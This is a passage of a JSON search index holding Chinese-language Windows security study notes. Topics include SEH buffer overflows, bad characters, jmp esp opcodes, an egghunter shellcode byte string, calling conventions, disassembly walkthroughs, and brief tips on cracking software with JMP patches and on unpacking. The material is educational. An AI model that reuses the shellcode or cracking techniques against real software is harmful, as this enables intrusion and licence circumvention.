\u5b57\u7b26\u90fd\u88ab\u8f6c\u6362\u6210\u4e86 \\x01 \u5230 \\x7f \u4e4b\u95f4\u7684\u5b57\u7b26\u3002 ASCII\u5b57\u7b26\u8303\u56f4\u662f \\x00 \u5230 \\x7f \uff0cLTER\u547d\u4ee4\u4ec5\u63a5\u53d7ASCII\u5b57\u7b26\uff0c\u4f1a\u5bf9ASCII\u4ee5\u5916\u7684\u5b57\u7b26\u8fdb\u884c\u8f6c\u6362 \u7528mona\u627e\u5230\u5408\u9002\u7684seh\u5229\u7528\u6307\u4ee4\u7ec4\u5730\u5740\uff0c\u4ec5\u6709ASCII\u5b57\u7b26\u7684\u5730\u5740 6250120b \u8ddf\u8e2a\u4e4b\u540e\u786e\u8ba4\u8986\u76d6\u4e86SEH \u4e0b\u4e00\u6b65\u662f\u8df3\u51faSEH\u533a\uff0c\u77ed\u8df3\u6307\u4ee4 jmp \u768416\u8fdb\u5236 \\xeb \u662f\u574f\u5b57\u7b26\uff0c\u4f7f\u7528\u6761\u4ef6\u8df3\u8f6c","title":"\u7ec3\u4e60G"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_29","text":"\u5728\u80fd\u63a7\u5236\u5bc4\u5b58\u5668\u503c\u7684\u60c5\u51b5\u4e0b\u53ef\u4ee5\u7ec4\u5408\u4f7f\u7528 jmp esp //FFE4 call esp //FFD4 pop eax; call eax","title":"\u4ee3\u7801\u6267\u884c\u6d41\u91cd\u5b9a\u5411\u6d41\u6307\u4ee4"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#egghunter","text":"PWND egghunter=b\"\" egghunter+=b\"\\x33\\xd2\\x66\\x81\\xca\\xff\\x0f\\x33\\xdb\\x42\\x53\\x53\\x52\\x53\\x53\\x53\" egghunter+=b\"\\x6a\\x29\\x58\\xb3\\xc0\\x64\\xff\\x13\\x83\\xc4\\x0c\\x5a\\x83\\xc4\\x08\\x3c\" egghunter+=b\"\\x05\\x74\\xdf\\xb8\\x50\\x57\\x4e\\x44\\x8b\\xfa\\xaf\\x75\\xda\\xaf\\x75\\xd7\" egghunter+=b\"\\xff\\xe7\"","title":"egghunter"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_30","text":"\u7528\u6237\u6a21\u5757\u4e2d\u6307\u4ee4\u7684\u5730\u5740\u5728\u4e0d\u540c\u7cfb\u7edf\u4e0a\u662f\u4e0d\u53d8\u7684\uff0c\u7cfb\u7edf\u6a21\u5757\u4e2d\u6307\u4ee4\u7684\u5730\u5740\u5728\u4e0d\u540c\u7cfb\u7edf\u4e0a\u662f\u4e0d\u540c\u7684\u3002 \u5982\u679c\u4f7f\u7528\u7528\u6237\u6a21\u5757\u7684\u91cd\u5b9a\u5411\u8bed\u53e5\u7684\u5730\u5740\u4e0d\u4f1a\u6709\u4ec0\u4e48\u95ee\u9898\uff0c\u4f46\u5982\u679c\u4f7f\u7528\u7cfb\u7edf\u6a21\u5757\u4e0a\u7684\u91cd\u5b9a\u5411\u8bed\u53e5\u5730\u5740\uff0c\u8fd9\u5c31\u4f1a\u5bfc\u81f4\u672c\u5730\u6d4b\u8bd5\u6210\u529f\u7684 EIP \u5730\u5740\u5728\u76ee\u6807\u673a\u5668\u4e0a\u4e0d\u53ef\u7528\u3002 !!\u7cfb\u7edf\u6a21\u5757\u4e2d\u7684\u6307\u4ee4\u5730\u5740\u5728\u4e0d\u540c\u7cfb\u7edf\u7248\u672c\u662f\u4e0d\u540c\u7684\u3002","title":"\u7528\u6237\u6a21\u5757\u548c\u7cfb\u7edf\u6a21\u5757\u91cd\u5b9a\u5411\u6307\u4ee4\u5730\u5740\u95ee\u9898"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#rop","text":"https://cwinfosec.org/Intro-ROP-DEP-Bypass/ https://fluidattacks.com/blog/vulnserver-trun-rop/ https://ctf101.org/binary-exploitation/return-oriented-programming/","title":"ROP"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#seh","text":"https://learn.microsoft.com/zh-tw/cpp/cpp/structured-exception-handling-c-cpp?view=msvc-170 https://blog.30cm.tw/2015/05/windowsbuffer-overflowsehshellcode.html https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/seh-based-buffer-overflow SEH\u662fwindows\u4e0a\u5904\u7406\u5f02\u5e38\u7684\u673a\u5236\uff0c\u5f02\u5e38\u4f1a\u7531SEH\u94fe\u4e00\u5c42\u5c42\u8f6c\u5165\u7cfb\u7edf\u5e95\u5c42\u3002 \u5728 TIB \u4e2d\uff0c\u6709\u4e00\u4e2a ExceptionList \u94fe\u8868\uff0c\u94fe\u8868\u4e2d\u6709\u4e00\u4e2a _EXCEPTION_REGISTRATION_RECORD \u7ed3\u6784\u4f53\u3002 \u5f53\u6570\u636e\u6ea2\u51fa\u5230 _EXCEPTION_REGISTRATION_RECORD \u7684\u6307\u9488\u4e0a\u65f6\uff0c\u4f1a\u5bfc\u81f4SEH\u6ea2\u51fa\u653b\u51fb typedef struct _EXCEPTION_REGISTRATION_RECORD { struct _EXCEPTION_REGISTRATION_RECORD *Prev; PEXCEPTION_ROUTINE Handler; } EXCEPTION_REGISTRATION_RECORD;","title":"SEH\u6ea2\u51fa\u653b\u51fb"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#aslraddress-space-layout-randomization","text":"ASLR\u4f7f\u7a0b\u5e8f\u6bcf\u6b21\u6267\u884c\u65f6\uff0c\u5185\u5b58\u4e2d\u7684\u5806\u3001\u6808BBS\u7b49\u6570\u636e\u6bcf\u6b21\u5b58\u653e\u5728\u4e0d\u540c\u7684\u5185\u5b58\u5730\u5740\uff0c\u4f7f\u5f97\u67e5\u627e\u504f\u79fb\u96be\u5ea6\u53d8\u5927\u3002","title":"ASLR(Address Space Layout Randomization)\u5730\u5740\u7a7a\u95f4\u968f\u673a\u5316"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_31","text":"CPU\u5728\u5904\u7406\u51fd\u6570\u4e2d\u7684\u53c2\u6570\u65f6\u7684\u4e00\u79cd\u8c03\u7528\u7ea6\u5b9a\u65b9\u6cd5\uff0c\u4e0d\u540c\u7684\u8c03\u7528\u7ea6\u5b9a\u4f7f\u7528\u7684\u5bc4\u5b58\u5668\u548c\u89c4\u5219\u4e0d\u5c3d\u76f8\u540c","title":"\u8c03\u7528\u7ea6\u5b9a"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#fastcall","text":"Fastcall\u662fx64 Windows\u7684\u8c03\u7528\u7ea6\u5b9a\uff0cWindows\u4e0a\u7684fastcall\u9ed8\u8ba4\u4f7f\u75284\u4e2a\u5bc4\u5b58\u5668\u3002","title":"Fastcall"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#fast-call","text":"- \u524d4\u4e2a\u53c2\u6570\u5728\u5bc4\u5b58\u5668\u4e2d\u4f20\u9012 - \u975e\u6d6e\u70b9\u503c(\u6d6e\u70b9\u6570\u6216\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570)\u7684\u53c2\u6570\u5c06\u901a\u8fc7RCX\u3001RDX\u3001R8\u548cR9(\u6309\u6b64\u987a\u5e8f)\u4f20\u9012\u3002\u975e\u6d6e\u70b9\u503c\u5305\u62ec\u6307\u9488\u3001\u6574\u6570\u3001\u5e03\u5c14\u503c\u3001\u5b57\u7b26\u7b49 - \u6d6e\u70b9\u53c2\u6570\u5c06\u901a\u8fc7XMM0\u3001XMM1\u3001XMM2\u548cXMM3\u4f20\u9012(\u6309\u6b64\u987a\u5e8f)\uff0c\u6d6e\u70b9\u6570\u5305\u62ec\u6d6e\u70b9\u6570\u548c\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570 - \u5982\u679c\u4f20\u9012\u7684\u53c2\u6570\u592a\u5927\uff0c\u65e0\u6cd5\u88c5\u5165\u5bc4\u5b58\u5668\uff0c\u5219\u901a\u8fc7\u5f15\u7528\u4f20\u9012 - \u53c2\u6570\u6c38\u8fdc\u4e0d\u4f1a\u5206\u5e03\u5728\u591a\u4e2a\u5bc4\u5b58\u5668\u4e2d\u3002\u5176\u4ed6\u53c2\u6570\u90fd\u653e\u5728\u6808\u4e0a\u3002 - \u57fa\u6307\u9488(base pointer, RBP)\u88ab\u4fdd\u5b58\uff0c\u4ee5\u4fbf\u6062\u590d\u3002 - \u5982\u679c\u51fd\u6570\u7684\u8fd4\u56de\u503c\u662f\u6574\u6570\u3001bool\u3001char\u7b49\uff0c\u5219\u901a\u8fc7RAX\u4f20\u9012\uff0c\u5982\u679c\u662f\u6d6e\u70b9\u6570\u6216double\uff0c\u5219\u901a\u8fc7XMM0\u4f20\u9012\u3002 - \u6210\u5458\u51fd\u6570(\u5c5e\u4e8e\u7c7b/\u7ed3\u6784\u4f53\u7684\u51fd\u6570)\u6709\u4e00\u4e2a\u8868\u793athis\u6307\u9488\u7684\u9690\u5f0f\u7b2c\u4e00\u4e2a\u53c2\u6570\u3002\u56e0\u4e3a\u5b83\u662f\u4e00\u4e2a\u6307\u9488\uff0c\u5b83\u5c06\u901a\u8fc7RCX.[1]\u4f20\u9012 - \u8c03\u7528\u8005\u8d1f\u8d23\u4e3a\u88ab\u8c03\u7528\u8005\u7684\u53c2\u6570\u5206\u914d\u7a7a\u95f4\u3002\u8c03\u7528\u8005\u5fc5\u987b\u603b\u662f\u4e3a4\u4e2a\u53c2\u6570\u5206\u914d\u7a7a\u95f4\uff0c\u5373\u4f7f\u6ca1\u6709\u4f20\u9012\u53c2\u6570\u3002 - \u5bc4\u5b58\u5668RAX\u3001RCX\u3001RDX\u3001R8\u3001R9\u3001R10\u3001R11\u88ab\u8ba4\u4e3a\u662f\u6613\u5931\u7684\uff0c\u5728\u51fd\u6570\u8c03\u7528\u65f6\u5fc5\u987b\u88ab\u8ba4\u4e3a\u662f\u88ab\u9500\u6bc1\u7684(\u9664\u975e\u6709\u5176\u4ed6\u5b89\u5168\u8bc1\u660e\u2014\u2014\u901a\u8fc7\u5206\u6790\uff0c\u5982\u6574\u4e2a\u7a0b\u5e8f\u4f18\u5316)\u3002 - \u5bc4\u5b58\u5668RBX\u3001RBP\u3001RDI\u3001RSI\u3001RSP\u3001R12\u3001R13\u3001R14\u548cR15\u88ab\u8ba4\u4e3a\u662f\u975e\u6613\u5931\u7684\uff0c\u5fc5\u987b\u901a\u8fc7\u4f7f\u7528\u5b83\u4eec\u7684\u51fd\u6570\u6765\u4fdd\u5b58\u548c\u6062\u590d \u51fd\u6570\u4e2d\u53c2\u6570\u7684\u4f20\u9012\u987a\u5e8f\u5982\u4e0b MOV DWORD PTR SS:[RSP + 0x38], 0x8 ;\u540c\u7406 MOV DWORD PTR SS:[RSP + 0x30], 0x7 ;\u540c\u7406 MOV DWORD PTR SS:[RSP + 0x28], 0x6 ;\u7b2c\u516d\u4e2a\u53c2\u6570\u4f20\u7ed9DWORD\u6307\u9488\uff0c\u7531\u4e8e\u662f\u53cc\u5b57\uff0c\u6240\u4ee5RSP\u5730\u5740\u662fRSP+0X28 MOV DWORD PTR SS:[RSP + 0x20], 0x5 ;\u7b2c\u4e94\u4e2a\u53c2\u6570\u4f20\u7ed9DWORD\u6307\u9488\uff0c\u5730\u5740\u662fRSP+0X20 MOV R9D, 0x4 ;\u7b2c\u56db\u4e2a\u53c2\u6570\u7ed9R9D MOV R8D, 0x3 ;\u7b2c\u4e09\u4e2a\u53c2\u6570\u7ed9R8D MOV EDX, 0x2 ;\u7b2c\u4e8c\u4e2a\u53c2\u6570\u7ed9EDX MOV ECX, 0x1 ;\u7b2c\u4e00\u4e2a\u53c2\u6570\u7ed9ECX CALL function","title":"Fast call\u7684\u5de5\u4f5c\u6a21\u5f0f"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#cdecl","text":"cdecl\u662fC\u8bed\u8a00\u8c03\u7528\u7ea6\u5b9a windows x86\u662f\u7528cdecl\u8c03\u7528\u7ea6\u5b9a - \u53c2\u6570\u5728\u6808\u4e0a\u5411\u540e\u4f20\u9012(\u4ece\u53f3\u5230\u5de6),\u4f9d\u7167\u6808\u5148\u5165\u540e\u51fa\u7684\u89c4\u77e9\uff0c\u5148\u4f20\u9012\u6700\u540e\u7684\u53c2\u6570\uff0c\u597d\u8ba9\u524d\u9762\u7684\u53c2\u6570\u5148\u51fa\u6765\u3002\u4e0d\u4f7f\u7528\u5bc4\u5b58\u5668 - \u57fa\u6307\u9488(base pointer, RBP)\u88ab\u4fdd\u5b58\uff0c\u4ee5\u4fbf\u6062\u590d\u3002 - \u8fd4\u56de\u503c\u901a\u8fc7EAX\u4f20\u9012\uff0c\u5982\u679c\u662f\u8fd4\u56de\u503c\u662f\u5b57\u8282\u6216\u5b57\u7b26\u90e8\u5206\uff0c\u5219\u4f7f\u7528EAX\u66f4\u4f4e\u4f4d\u8fd4\u56de - \u8c03\u7528\u8005\u6e05\u9664\u5806\u6808\u3002\u8fd9\u5c31\u662fcdecl\u7684\u7279\u522b\u4e4b\u5904\u3002\u56e0\u4e3a\u8c03\u7528\u8005\u4f1a\u6e05\u9664\u5806\u6808\uff0c\u6240\u4ee5cdecl\u5141\u8bb8\u53ef\u53d8\u6570\u91cf\u7684\u53c2\u6570\u3002 - 32\u4f4d\u7684x86\uff0c\u5728\u6808\u4e0a\u4f20\u53c2 - linux\u4e0a64\u4f4d\u7684x86\uff0cRDI\u3001RSI\u3001RDX\u3001RCX\u3001R8\u548cR9\u4e2d\u6309\u987a\u5e8f\u653e\u7f6e\u6700\u591a6\u4e2a\u53c2\u6570\uff0c\u5176\u4f59\u53c2\u6570\u5728\u6808\u4e0a -","title":"cdecl"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#stdcall","text":"Standard Calling\u6807\u51c6\u8c03\u7528\u7ea6\u5b9a\uff0c\u572832\u4f4d\u7684dll\u6587\u4ef6\u4e2d\u4f7f\u7528\u7684\u662f\u8fd9\u79cd - \u53c2\u6570\u4ece\u53f3\u5230\u5de6\u5728\u6808\u4e0a\u4f20\u9012\uff0c\u4e0d\u9002\u7528\u5bc4\u5b58\u5668 - \u88ab\u8c03\u7528\u51fd\u6570\u6e05\u9664\u6808\uff0c\u53ea\u80fd\u5141\u8bb8\u56fa\u5b9a\u6570\u91cf\u53c2\u6570\u7684\u51fd\u6570","title":"stdcall"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#exe","text":"","title":"\u7b80\u5355exe\u5206\u6790"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#printf","text":"\u901a\u8fc7\u5b57\u7b26\u4e32\u5b9a\u4f4d\u5230\u51fd\u6570\u4f4d\u7f6e\uff0c\u672c\u4f8b\u4e2d\u77e5\u9053Hello Word\u5b57\u7b26\u4e32\u5c31\u662fmain\u51fd\u6570\u4e2d\u7684 \u901a\u8fc7xAnalyzer\u63d2\u4ef6\u53ef\u4ee5\u5206\u6790\u51fa\u51fd\u6570\u4f4d\u7f6e\uff0c\u5e26 $ \u5e76\u4e0b\u9762\u6709\u6bb5\u62ec\u53f7\u7684\u5c5e\u4e8e\u51fd\u6570\u6bb5 SUB RSP,0x28 //RSP\u51cf\u4e86\u4e00\u4e2a\u503c\u3002\u5c5e\u4e8e\u51fd\u6570\u5e8f\u8a00 LEA RCX,QWORD PTR DS:[0x7FF6FA32E430] //\u5c060x7FF6FA32E430\u5730\u5740\u6307\u5230RCX\uff0c\u5728Fastcall\u4e2d\uff0cRCX\u662f\u7528\u4e8e\u7ed9\u51fd\u6570\u4f20\u53c2\u7684\u7b2c\u4e00\u4e2a\u503c\u3002\u5728\u8fd9\u91cc\u662f\u5c06Hello Word\u4f20\u7ed9\u4e86printf CALL <consoleapplication2.sub_7FF6FA311010> //\u8c03\u7528\u51fd\u6570\uff0c\u8fd9\u91cc\u662fprintf\u51fd\u6570 XOR EAX,EAX //\u5f02\u6216EAX\uff0c\u5f02\u6216\u81ea\u8eab\u7ed3\u679c\u4e3a0 ADD RSP,0x28 //\u8fd8\u539f\u6808 RET //\u8fd4\u56de\u8c03\u7528,main\u51fd\u6570\u7ed3\u679c","title":"Printf\u51fd\u6570"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_32","text":"EBX/RBX\u662f\u5faa\u73af\u7684\u7279\u5f81 \u5982\u56fe\u6240\u793a - \u5faa\u73af\u4ece0\u5f00\u59cb\uff0cEBX\u88ab\u5f02\u6216\u62100 - EBX\u4e3a\u5faa\u73af\u7d22\u5f15\uff0c\u4e14\u4f20\u7ed9\u4e86EDX\uff0c\u4e3a\u51fd\u6570\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570 - \u4e00\u4e2a\u5b57\u7b26\u4e32\u7684\u5730\u5740\u6307\u5230\u4e86RCX\uff0c\u4e3a\u51fd\u6570\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570 - \u8c03\u7528\u4e86printf\u51fd\u6570 - EBX\u9012\u589e1 - CMP\u6bd4\u8f830xA(10)\u548cEBX(\u6b64\u65f6\u4e3a1)\uff0cEBX = EBX - 0xA - JL\u6839\u636eS\u6807\u5fd7\u4f4d\u8df3\u8f6c\uff0c\u7531\u4e8e\u4e0a\u4e00\u6b65\u7ed3\u679c\u662f1-10\u4e3a\u8d1f\u6570\uff0c\u6240\u4ee5SF\u4e3a1\uff0c\u5219\u8df3\u8f6c","title":"\u5faa\u73af"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#dll","text":"\u8fd9\u662f\u6b64dll\u4e2d\u7684\u5bfc\u5165\u51fd\u6570","title":"\u7b80\u5355DLL\u5206\u6790"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_33","text":"dll\u7684\u5bfc\u51fa\u51fd\u6570\u4e2d\uff0c\u5e26\u6709 @ \u3001 ? \u7684\u90fd\u662f\u4fee\u9970\u51fd\u6570\uff0c\u5982\u679c\u4e00\u4e2a\u51fd\u6570\u6ca1\u6709\u88ab\u4fee\u9970\uff0c\u90a3\u4ed6\u662fC\u51fd\u6570\u6216\u8005\u4f7f\u7528 extern \"C\" \u7533\u660e\u4e86\u662fC\u51fd\u6570\u3002 \u4fee\u9970\u51fd\u6570\u7684\u597d\u5904\u662f\u53ef\u4ee5\u770b\u5230\u8fd4\u56de\u7c7b\u578b\u548c\u53c2\u6570","title":"\u4fee\u9970\u51fd\u6570"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#sayhello","text":"\u5bf9\u5e94\u52a0\u8f7d\u7684exe #include <iostream> #include <Windows.h> typedef void(WINAPI* aa)(void); //\u5b9a\u4e49\u4e00\u4e2a\u51fd\u6570\u7c7b\u578b\u4ee5\u4f9b\u4f7f\u7528 int main() { HMODULE dll = LoadLibraryA(\"DLL.DLL\"); //\u8f7d\u5165dll if (dll != NULL) { aa aa1 = (aa)GetProcAddress(dll, \"SayHello\"); //\u4ecedll\u53e5\u67c4\u52a0\u8f7dSayHello\u51fd\u6570\u7684\u5730\u5740\uff0c\u5e76\u4f20\u7ed9\u81ea\u5b9a\u4e49\u51fd\u6570aa1 if (aa1 != NULL) { aa1(); //\u8c03\u7528aa1\uff0c\u4e5f\u5c31\u662f\u8c03\u7528dll\u4e2d\u7684SayHello } else { printf(\"Can't load the function.\"); } } }","title":"\u8c03\u7528SayHello"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#printarray","text":"test edx,edx ;edx\u4e0e\u81ea\u8eab\u8fdb\u884cAND\u6bd4\u8f83 jle dll.7FF960511F18 ;jle\u67e5\u770b\u6807\u5fd7\u4f4d\uff0cZF\u4e3a1\u4e5f\u5c31\u662fedx\u662f0\u7684\u60c5\u51b5\u4e0b\u8df3\u8f6c\u5230ret\uff0c\u7ed3\u675f\u51fd\u6570 mov qword ptr ss:[rsp+0x10],rsi ;RSI\u8d4b\u7ed9rsp+0x10\u5730\u5740 push rdi ;\u5165\u6808 sub rsp,0x20 ;\u51fd\u6570\u5e8f\u8a00 mov qword ptr ss:[rsp+0x30],rbx ;RBX\u88ab\u5b58\u5230RSP+0x30\u4f4d\u7f6e mov rsi,rcx ;\u7b2c\u4e00\u4e2a\u51fd\u6570\u53c2\u6570RCX\u4f20\u9012\u7ed9RSI xor ebx,ebx ;EBX\u7f6e0 movsxd rdi,edx ;\u7b2c\u4e8c\u4e2a\u53c2\u6570EDX\u4f20\u9012\u7ed9RDI mov edx,dword ptr ds:[rsi+rbx*4] ;rsi+rbx*4\u5730\u5740\u4f20\u7ed9edx call <dll.sub_7FF9605120B0> ;\u8c03\u7528\u51fd\u6570\uff0c\u8fd9\u662fstd::cout call <dll.sub_7FF960514DD0> ;\u8c03\u7528\u51fd\u6570\uff0c\u8fd9\u662fstd::end inc rbx ;rbx\u81ea\u52a01 cmp rbx,rdi ;\u6bd4\u8f83rbx\u548crdi\uff0crdi\u7684\u503c\u662f\u7b2c\u4e8c\u4e2a\u53c2\u6570\u7684\u503c jl dll.7FF960511EA0 ;rbx\u5c0f\u4e8e\u7b2c\u4e8c\u4e2a\u53c2\u6570\u5219\u8df3\u8f6c","title":"PrintArray"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#initializeplayer","text":"mov dword ptr ds:[rcx],0x20 ;0x20\u79fb\u52a8\u5230rcx\uff0crcx\u662f\u7b2c\u4e00\u4e2a\u53c2\u6570 lea rdx,qword ptr ds:[0x7FF960549718] ;\u8fd9\u662f\u4e2a\u5b57\u7b26\u4e32\uff0c\u5730\u5740\u8d4b\u7ed9\u4e86rdx\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570","title":"InitializePlayer"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_34","text":"- \u7b80\u5355\u52a0\u5bc6\u7684\u8f6f\u4ef6\u901a\u5e38\u53ef\u4ee5\u5728\u627e\u5230\u5173\u952e\u51fd\u6570\u540e\uff0c\u91c7\u7528JMP\u7834\u89e3 - \u91c7\u7528\u8054\u7f51\u8ba4\u8bc1\u7684\u8f6f\u4ef6\uff0c\u9700\u8981\u627e\u5230\u4fdd\u62a4\u51fd\u6570","title":"\u7834\u89e3\u8f6f\u4ef6\u7684\u8981\u70b9"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_35","text":"\u52a0\u58f3\u7684\u7279\u70b9 - \u8f83\u9ad8\u7684\u71b5\uff08\u5927\u4e8e\u7b49\u4e8e7\uff09 - \u8f83\u5c11\u7684\u5bfc\u5165\u51fd\u6570 - \u7279\u5b9a\u6253\u5305\u5668\u7684\u6807\u8bc6 \u6839\u636e\u5185\u5b58\u5206\u914d\u8c03\u7528\u548c\u5185\u5b58\u5c5e\u6027\u66f4\u6539\u8c03\u7528\u624b\u52a8\u627e\u5230\u6253\u5305\u540e\u7684\u4ee3\u7801\u6216\u63d0\u53d6shellcode","title":"\u8131\u58f3"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_36","text":"","title":"\u6982\u5ff5&amp;\u672f\u8bed"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#uipi-user-interface-privilege-isolation","text":"\u5168\u79f0\u7528\u6237\u754c\u9762\u6743\u9650\u9694\u79bb\uff0c\u5728Windows 2008\u540e\u5f15\u5165\uff0c\u7981\u6b62\u4f4e\u6743\u9650\u8fdb\u7a0b\u5229\u7528\u6d88\u606f\u673a\u5236\u5bf9\u9ad8\u6743\u9650\u8fdb\u7a0b\u8fdb\u884c\u4efb\u610f\u64cd\u4f5c\u3002 \u8be5\u8bbe\u7f6e\u9ed8\u8ba4\u5f00\u542f\uff0c\u4f4d\u4e8e\u6ce8\u518c\u8868 HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System EnableUIPI\u9879\u4e3a0\u8868\u793a\u7981\u7528\u529f\u80fd","title":"UIPI   (User Interface Privilege Isolation)"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#sspi-security-support-provider-interface","text":"\u5b89\u5168\u652f\u6301\u63d0\u4f9b\u7a0b\u5e8f\u63a5\u53e3\uff0c\u53ef\u5e2e\u52a9\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u5efa\u7acb\u548c\u7ef4\u62a4\u5b89\u5168\u901a\u9053\uff0c\u63d0\u4f9b\u673a\u5bc6\u6027\u3001\u5b8c\u6574\u6027\u548c\u8eab\u4efd\u9a8c\u8bc1\u3002","title":"SSPI  (Security Support Provider Interface)"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#bit-bytes","text":"Bit\uff1a0 or 1 Nibble: 4 bits Byte: 8 bits Word: 2 bytes, 16 bits DWORD: 4 bytes, 32 bits QWORD: 8 bytes, 64 bits","title":"Bit &amp; Bytes"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_37","text":"NOT \u975e AND \u4e14 OR \u6216 XOR \u5f02\u6216\uff0c\u76f8\u540c\u4e3a0\uff0c\u4e0d\u540c\u4e3a1","title":"\u4e8c\u8fdb\u5236\u8fd0\u7b97"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_38","text":"","title":"\u8fd0\u884c\u5e93&amp;\u51fd\u6570"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_set_app_type","text":"\u5728\u542f\u52a8\u65f6\u4f7f\u7528\u7684\u5185\u90e8\u51fd\u6570\u544a\u77e5 CRT\uff0c\u5e94\u7528\u5c5e\u4e8e\u63a7\u5236\u53f0\u5e94\u7528\u7a0b\u5e8f\u8fd8\u662f GUI \u5e94\u7528\u3002","title":"_set_app_type"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#controlfp","text":"\u7528\u6765\u8bbe\u7f6e\u6216\u8005\u67e5\u8be2\u6d6e\u70b9\u73af\u5883\u7684\u63a7\u5236\u4f4d\uff0c\u4f8b\u5982\u820d\u5165\u6a21\u5f0f\u3001\u5f02\u5e38\u5904\u7406\u65b9\u5f0f\u7b49","title":"controlfp"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_iob_func","text":"\u6807\u51c6\u8f93\u5165/\u8f93\u51fa\u6d41\u76f8\u5173","title":"_iob_func"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_interlockedcompareexchange64","text":"\u5bf9\u6570\u636e\u8fdb\u884c\u539f\u5b50\u6bd4\u8f83\u7684\u51fd\u6570\uff0c\u786e\u4fdd\u6570\u636e\u4e0d\u4f1a\u88ab\u6539\u53d8 LONG64 _InterlockedCompareExchange64(LONG64 volatile* Destination, LONG64 Exchange, LONG64 Comparand); \u5f53\u7b2c\u4e00\u4e2a\u53c2\u6570Destination\u7b49\u4e8e\u7b2c\u4e09\u4e2a\u53c2\u6570Comparand\u65f6\uff0c\u5c06\u7b2c\u4e00\u4e2a\u53c2\u6570\u66ff\u6362\u4e3a\u7b2c\u4e8c\u4e2a\u53c2\u6570Exchange\u3002 \u786e\u4fddDestination\u7684\u503c\u548cExchange\u76f8\u7b49","title":"_InterlockedCompareExchange64"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#seh_1","text":"__except \u5f02\u5e38\u8fc7\u6ee4\u5668\u7684\u8fd4\u56de\u503c EXCEPTION_EXECUTE_HANDLER //EXCEPTION_EXECUTE_HANDLER\u7684\u8fd4\u56de\u503c\u5411SEH\u53d1\u51fa\u4fe1\u53f7\uff0c\u4ee5\u6267\u884c__except\u5757\u4e2d\u7684\u4ee3\u7801\u3002 EXCEPTION_CONTINUE_SEARCH 